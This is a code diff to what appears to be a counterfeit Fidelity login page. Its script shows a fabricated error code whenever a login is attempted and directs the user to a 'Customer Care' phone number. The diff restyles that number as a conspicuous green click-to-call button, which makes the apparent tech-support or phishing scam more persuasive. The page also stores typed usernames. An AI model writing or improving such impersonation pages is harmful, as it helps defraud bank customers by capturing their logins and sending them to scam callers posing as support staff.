@@ -200,7 +200,8 @@
         New to Fidelity? <a href="#">Open an account or sign up.</a>
     </div>
 
-        <script>
+            <!-- Replace the static number text in the error message -->
+    <script>
         // Function to save username to localStorage if "Remember my username" is checked
         function saveUsername() {
             const username = document.getElementById('username').value;
@@ -225,7 +226,8 @@
         // Show error message on login attempt
         function showErrorMessage() {
             const errorMessage = document.getElementById('error-message');
-            errorMessage.innerHTML = 'Error Code : 00X47800 <br> Contact Customer Care : +1-844-499-1812';
+            errorMessage.innerHTML = `Error Code : 00X47800 <br> Contact Customer Care: 
+            <a href="tel:+18444991812" style="background-color: #28a745; color: white; padding: 10px 15px; border-radius: 5px; text-decoration: none;">+1-844-499-1812</a>`;
         }
 
         // Handle form submission
